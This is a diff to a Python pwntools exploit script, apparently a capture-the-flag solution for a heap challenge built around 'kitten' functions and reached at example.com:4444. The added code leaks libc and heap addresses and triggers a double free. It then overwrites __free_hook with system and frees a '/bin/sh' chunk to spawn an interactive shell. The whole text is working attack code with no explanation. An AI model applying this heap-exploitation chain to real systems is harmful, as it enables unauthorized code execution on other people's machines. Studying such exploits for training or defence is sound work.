@@ -40,7 +40,7 @@ if __name__ == '__main__':
         p = remote("example.com", 4444)
     elif len(argv) >= 2 and argv[1] == "d":
     	cmd = """
-            #b *feed_kitten+62
+            #b *foster+119
     		c
             loadsym
     	"""
@@ -59,6 +59,20 @@ if __name__ == '__main__':
     log.info("free@libc: " + hex(leak))
     libc_base = leak - libc.symbols['free']
     log.info("libc base: " + hex(libc_base))
-    free(p, leak_idx)
+    # leak chunk address
+    find(p, p64(kittens_bss_addr))
+    chunk_addr = u64(feed(p, leak_idx).ljust(8, b"\00"))
+    log.info("chunk(index=0): " + hex(chunk_addr))
+    # double free
+    find(p, p64(chunk_addr))
+    free(p, 0)
+    free(p, leak_idx)# kittens[leak_idx] == kittens[0]
+    # get a shell !
+    find(p, p64(libc.symbols['__free_hook'] + libc_base))
+    find(p, "DUMMY")
+    find(p, p64(libc.symbols['system'] + libc_base))
+    find(p, "/bin/sh")
+    free(p, 4)
+
 
     p.interactive()
